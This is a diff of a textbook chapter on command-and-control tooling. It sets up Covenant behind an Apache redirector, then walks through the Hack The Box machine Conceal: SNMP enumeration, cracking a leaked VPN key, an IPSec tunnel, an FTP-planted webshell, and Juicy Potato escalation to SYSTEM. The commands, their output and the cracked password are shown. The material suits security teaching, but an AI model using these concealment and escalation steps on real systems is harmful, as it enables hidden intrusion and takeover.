@@ -1,24 +1,24 @@
 # Command & Control
 
-> Although more commonly associated with malicious adversaries and Red Teaming, Command and Control \(C2\) software is essential in a post exploitation environment in which persistence is required. We have already used Metasploit which is a C2 that is run locally. However, C2s need to be able to run on server infrastructure that can be hidden from anyone tracing communications back from a victim's machine. In this chapter, we will look a Covenant, a C2 written in C\# that can be run on Linux as well as Windows. To not expose the IP address of the C2 server, we will use an HTTP redirector. We will run through using Covenant creating listeners, launchers and grunts. Getting ownership of one machine may open up opportunities to reach other devices on attached networks. Pivoting is the means of establishing network connections to access these remote networks. We will cover different approaches to
+> Although more commonly associated with malicious adversaries and Red Teaming, Command and Control (C2) software is essential in a post exploitation environment in which persistence is required. We have already used Metasploit which is a C2 that is run locally. However, C2s need to be able to run on server infrastructure that can be hidden from anyone tracing communications back from a victim's machine. In this chapter, we will look a Covenant, a C2 written in C# that can be run on Linux as well as Windows. To not expose the IP address of the C2 server, we will use an HTTP redirector. We will run through using Covenant creating listeners, launchers and grunts. Getting ownership of one machine may open up opportunities to reach other devices on attached networks. Pivoting is the means of establishing network connections to access these remote networks. We will cover different approaches to
 
 
 
-A command-and-control server \(C2 or C&C\) is a server that is able to communicate with, and control, software, referred to as an implant, that is running on a victim's device. Normally the communication between implant and C2 will be indirect, passing through a redirector located on a different machine, so as to protect the network address and location of the C2 server. The communication channels between implant and C2 will normally be encrypted and may use a range of protocols including HTTPS, DNS, FTP and SSH. The C2 normally handles creating and using certificates for encrypted communications. The redirector is bi-directional, acting as a proxy and reverse-proxy server. Redirectors can be made to redirect non-C2 traffic to an innocent website. An example of an HTTP redirector that could be used is Apache.
+A command-and-control server (C2 or C\&C) is a server that is able to communicate with, and control, software, referred to as an implant, that is running on a victim's device. Normally the communication between implant and C2 will be indirect, passing through a redirector located on a different machine, so as to protect the network address and location of the C2 server. The communication channels between implant and C2 will normally be encrypted and may use a range of protocols including HTTPS, DNS, FTP and SSH. The C2 normally handles creating and using certificates for encrypted communications. The redirector is bi-directional, acting as a proxy and reverse-proxy server. Redirectors can be made to redirect non-C2 traffic to an innocent website. An example of an HTTP redirector that could be used is Apache.
 
 Implants can be programmed to be persistent, and to communicate with the C2 at set time intervals.
 
 C2 services can also provide the ability to create implants of various kinds, handle AV and Firewall evasion and provide monitoring from the implants.
 
-In a normal C2 architecture, the C2 server would be located on its own server with the communication redirector on a separate machine \(or machines\). A client would be used to communicate with the C2 to issue commands and view results and data exfiltrated from the implants.
+In a normal C2 architecture, the C2 server would be located on its own server with the communication redirector on a separate machine (or machines). A client would be used to communicate with the C2 to issue commands and view results and data exfiltrated from the implants.
 
-From this definition, Metasploit would be considered a C2. Although we have been running it interactively on our attack VM, Metasploit can be hosted remotely and run as a service. Communication with the service is then done through its RPC \(Remote Procedure Call\) interface which is as simple as using netcat to connect to it. The majority of Metasploit modules are proxy-aware and so can be used through a proxy acting as a redirector for concealment purposes.
+From this definition, Metasploit would be considered a C2. Although we have been running it interactively on our attack VM, Metasploit can be hosted remotely and run as a service. Communication with the service is then done through its RPC (Remote Procedure Call) interface which is as simple as using netcat to connect to it. The majority of Metasploit modules are proxy-aware and so can be used through a proxy acting as a redirector for concealment purposes.
 
 C2s can operate independently, programmed to take a course of actions and responses, or they can be used interactively by one or more attackers. In a red team or penetration test operation where there may be more than one person attacking a network, collaboration and sharing of information between team members is important and some C2s offer this type of collaborative functionality.
 
 ## Covenant as a C2
 
-We are going to look at Covenant as an example of another type of C2. Covenant is written in C\# and although it can be set up on a Linux host, we will run it on Windows as the setup is very straightforward. Covenant calls its implants "Grunts" from the US slang of a low-ranking soldier being called a "grunt". Grunts are created and run by "Launchers" which allow for the use of different languages \(PowerShell or C\#\), evasion techniques, communications type, and execution types. Listeners are the same as handlers on Metasploit. They listen for connections and communicate with grunts sending them Tasks which are commands to carry out and report back on when complete.
+We are going to look at Covenant as an example of another type of C2. Covenant is written in C# and although it can be set up on a Linux host, we will run it on Windows as the setup is very straightforward. Covenant calls its implants "Grunts" from the US slang of a low-ranking soldier being called a "grunt". Grunts are created and run by "Launchers" which allow for the use of different languages (PowerShell or C#), evasion techniques, communications type, and execution types. Listeners are the same as handlers on Metasploit. They listen for connections and communicate with grunts sending them Tasks which are commands to carry out and report back on when complete.
 
 ### Installing Covenant
 
@@ -31,15 +31,15 @@ dotnet build
 dotnet run
 ```
 
-If you don't have a development environment on Windows, you can download DotNet Core \(https://dotnet.microsoft.com/download/dotnet-core/3.1\) which was the supported version at the time of writing.
+If you don't have a development environment on Windows, you can download DotNet Core (https://dotnet.microsoft.com/download/dotnet-core/3.1) which was the supported version at the time of writing.
 
-Running Covenant will allow you to navigate to https://127.0.0.1:7443 \(you will need to accept the exception to go to the site as the certificate is not trusted\) and create a user 
+Running Covenant will allow you to navigate to https://127.0.0.1:7443 (you will need to accept the exception to go to the site as the certificate is not trusted) and create a user&#x20;
 
-![Initial screen of Covenant](../.gitbook/assets/0%20%289%29.png)
+![Initial screen of Covenant](<../.gitbook/assets/0 (9).png>)
 
 Once logged in, you will be presented with a Dashboard that lists all running Grunts, Listeners and Taskings. A menu on the left allows you to navigate into the different sections of the application.
 
-![Covenant Dashboard](../.gitbook/assets/1%20%288%29.png)
+![Covenant Dashboard](<../.gitbook/assets/1 (8).png>)
 
 
 
@@ -63,7 +63,7 @@ sudo a2ensite 000-default.conf
 
 Before we make changes to this file, we need to know the paths that we are going to use. If we go into Covenant and click on the Listeners item in the menu and then select Profiles, you will see a list of possible profiles you can use. Clicking on the DefaultHttpProfile, there is a list of URLs that Covenant will use to communicate between Grunt and Listener:
 
-```text
+```
 /en-us/index.html
 /en-us/docs.html
 /en-us/test.html
@@ -95,23 +95,23 @@ Once these changes are made, we can restart the Apache server and check that the
 service apache2 restart
 ```
 
-![Home page of the Apache redirector](../.gitbook/assets/2%20%2810%29.png)
+![Home page of the Apache redirector](<../.gitbook/assets/2 (10).png>)
 
-We can now go back to Covenant and create a Listener. The only thing we need to do here is to add and entry for the ConnectAddresses that points to the redirector \(Figure 10-4\). We can leave the HTTP profile as default. In practice, we could change the URLs and the contents of the messages that are sent to and from the grunt as the defaults are pretty basic.
+We can now go back to Covenant and create a Listener. The only thing we need to do here is to add and entry for the ConnectAddresses that points to the redirector (Figure 10-4). We can leave the HTTP profile as default. In practice, we could change the URLs and the contents of the messages that are sent to and from the grunt as the defaults are pretty basic.
 
-![Creating a listener with the ConnectAddress pointing to the redirector](../.gitbook/assets/3%20%289%29.png)
+![Creating a listener with the ConnectAddress pointing to the redirector](<../.gitbook/assets/3 (9).png>)
 
-Once this is done, we can now use a Launcher to create the PowerShell script that we could run on a target host. Again, we will leave everything as is and just select Redirect as the Listener if it hasn't done this automatically 
+Once this is done, we can now use a Launcher to create the PowerShell script that we could run on a target host. Again, we will leave everything as is and just select Redirect as the Listener if it hasn't done this automatically&#x20;
 
-![Getting code to launch a grunt using PowerShell](../.gitbook/assets/4%20%288%29.png)
+![Getting code to launch a grunt using PowerShell](<../.gitbook/assets/4 (8).png>)
 
-Once this code is run \(we can run it on the same machine, it will send its communications via the redirector in any case\), we will see a grunt being activated and appear in the Dashboard of Covenant. The grunt will by default report back information about the user and computer that it is running on
+Once this code is run (we can run it on the same machine, it will send its communications via the redirector in any case), we will see a grunt being activated and appear in the Dashboard of Covenant. The grunt will by default report back information about the user and computer that it is running on
 
-![Grunt running on the target box and reporting basic information](../.gitbook/assets/5%20%287%29.png)
+![Grunt running on the target box and reporting basic information](<../.gitbook/assets/5 (7).png>)
 
 We can now interact with the grunt using the Interact tab and use one of a selection of different commands or tasks such as whoami
 
-![Sending a whoami command to the grunt and getting a reply](../.gitbook/assets/6%20%283%29.png)
+![Sending a whoami command to the grunt and getting a reply](<../.gitbook/assets/6 (3).png>)
 
 Covenant provides a long list of other tasks that can be run on the target machine that include methods for bypassing AMSI and UAC, uploading and downloading files, navigating the file system and running software and other commands.
 
@@ -236,7 +236,7 @@ PORT STATE SERVICE VERSION
 <SNIP>
 ```
 
-We can use the utility snmpwalk.pl to enumerate SNMP on the machine. As a reminder, SNMP is the Simple Network Management Protocol which is a protocol for collecting information from devices and sending commands to control them. SNMP uses a hierarchical namespace to organize information about a device. This is called a management information base \(MIB\). MIBs use object identifiers \(OID\) to identify individual items within a MIB.
+We can use the utility snmpwalk.pl to enumerate SNMP on the machine. As a reminder, SNMP is the Simple Network Management Protocol which is a protocol for collecting information from devices and sending commands to control them. SNMP uses a hierarchical namespace to organize information about a device. This is called a management information base (MIB). MIBs use object identifiers (OID) to identify individual items within a MIB.
 
 When we do snmapwalk on Conceal, we get a huge amout of information back although the OIDs are not translated into proper labels.
 
@@ -274,7 +274,7 @@ When we do snmapwalk on Conceal, we get a huge amout of information back althoug
 <SNIP>
 ```
 
-One thing we notice immediately is that there is an IKE VPN password PSK \(pre-shared key\) which is 9C8B1A372B1878851BE2C097031B6E43. If we check this hash online, or through listing hashcat hash examples, it is likely to be an NTLM hash. We can crack it with hashcat as follows:
+One thing we notice immediately is that there is an IKE VPN password PSK (pre-shared key) which is 9C8B1A372B1878851BE2C097031B6E43. If we check this hash online, or through listing hashcat hash examples, it is likely to be an NTLM hash. We can crack it with hashcat as follows:
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/Conceal]
@@ -314,7 +314,7 @@ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
 <SNIP>
 ```
 
-This produces labelled information from SNMP largely of the same content that was enumerated by nmap. We can see that there is a WAN Miniport \(IKEv2\) interface that is marked as being down. This, along with the open UDP port 500 and the IKE password suggests that the machine supports an IPSec VPN. The TCP connections show that FTP and HTTP are running on ports 21 and 80 but just not accessible from the outside, as we have previously seen from the nmap scan.
+This produces labelled information from SNMP largely of the same content that was enumerated by nmap. We can see that there is a WAN Miniport (IKEv2) interface that is marked as being down. This, along with the open UDP port 500 and the IKE password suggests that the machine supports an IPSec VPN. The TCP connections show that FTP and HTTP are running on ports 21 and 80 but just not accessible from the outside, as we have previously seen from the nmap scan.
 
 To explore the IPSec on Conceal, we can use ike-scan:
 
@@ -336,17 +336,17 @@ Ending ike-scan 1.9.4: 1 hosts scanned in 0.338 seconds (2.96 hosts/sec). 1 retu
 
 The important information from this is the SA= line which represents the security association configuration information. ike-scan can sometimes get the hash using aggressive mode, but we already have the hash and in any case it doesn't work on Conceal.
 
-We are going to use Windows for the next phase and set up an IPSec tunnel. To set up an IPSec tunnel, we go into the Windows Defender Firewall with Advanced Security application and click New Rule on Connection Security Rules \(Figure 10-8\)
+We are going to use Windows for the next phase and set up an IPSec tunnel. To set up an IPSec tunnel, we go into the Windows Defender Firewall with Advanced Security application and click New Rule on Connection Security Rules (Figure 10-8)
 
 ![Graphical user interface, application
 
-Description automatically generated](../.gitbook/assets/7%20%285%29.png)
+Description automatically generated](<../.gitbook/assets/7 (5).png>)
 
 Creating a new IPSec connection on Windows
 
 ![Graphical user interface, application, Teams
 
-Description automatically generated](../.gitbook/assets/8%20%286%29.png)
+Description automatically generated](<../.gitbook/assets/8 (6).png>)
 
 Specifying the IP address of conceal.htb and our box
 
@@ -354,7 +354,7 @@ We can leave the default setting for authentication inbound and outbound and the
 
 ![Graphical user interface, text, application
 
-Description automatically generated](../.gitbook/assets/9%20%281%29.png)
+Description automatically generated](<../.gitbook/assets/9 (1).png>)
 
 Specifying the authentication method as a Preshared key **Dudecake1!**
 
@@ -362,13 +362,13 @@ We need to select the protocol type as TCP that will be carried by the tunnel
 
 ![Graphical user interface, application, Teams
 
-Description automatically generated](../.gitbook/assets/10%20%285%29.png)
+Description automatically generated](<../.gitbook/assets/10 (5).png>)
 
 Configure the protocol type as TCP
 
 Finally, we give the connection a name and then can check if it is working by doing an nmap scan on port 445
 
-```text
+```
 c:\Users\rin\Desktop
 nmap -p 445 -sT conceal.htb
 <SNIP>
@@ -398,7 +398,7 @@ ftp: 1405 bytes sent in 0.39Seconds 3.65Kbytes/sec.
 ftp>
 ```
 
-Typing in whoami into the cmd gives us conceal\destitute \(Figure 10-12\)
+Typing in whoami into the cmd gives us conceal\destitute (Figure 10-12)
 
 ![whoami command in webshell on Conceal](../.gitbook/assets/11.png)
 
@@ -416,7 +416,7 @@ You should see a hit on the python web server and then in Covenant, a notificati
 CONCEAL\Destitute
 ```
 
-We can run Seatbelt -group=all which is an application like winPEAS and suggest privilege escalations for us. Going through the output, the current user has SeImpersonatePrivilege privilege. This means we can probably use Juicy Potato. We can get a release version of this from GitHub \(https://github.com/ohpe/juicy-potato\) and upload it using the command upload in Covenant. We can upload to c:\Users\Destitute\Desktop. We will also upload the PowerShell script from the Launcher as a batch file. We can run Juicy Potato then with the command
+We can run Seatbelt -group=all which is an application like winPEAS and suggest privilege escalations for us. Going through the output, the current user has SeImpersonatePrivilege privilege. This means we can probably use Juicy Potato. We can get a release version of this from GitHub (https://github.com/ohpe/juicy-potato) and upload it using the command upload in Covenant. We can upload to c:\Users\Destitute\Desktop. We will also upload the PowerShell script from the Launcher as a batch file. We can run Juicy Potato then with the command
 
 ```bash
 (admin) > cmd .\juicy.exe -t * -p c:\users\destitute\desktop\grunt.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
@@ -427,11 +427,10 @@ Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 9001
 [+] CreateProcessWithTokenW OK
 ```
 
-Note that the CLSID is something that I got from the site https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_10\_Enterprise\) and it is for the Windows Update Server \(wuaserv\). On running the batch file, we will get another grunt activated on Covenant and this time it will be as user NT Authority\System
+Note that the CLSID is something that I got from the site https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_10\_Enterprise) and it is for the Windows Update Server (wuaserv). On running the batch file, we will get another grunt activated on Covenant and this time it will be as user NT Authority\System
 
 ```bash
 [2/1/2021 6:05:20 AM UTC] WhoAmI completed
 (admin) > whoami
 NT AUTHORITY\SYSTEM
 ```
-
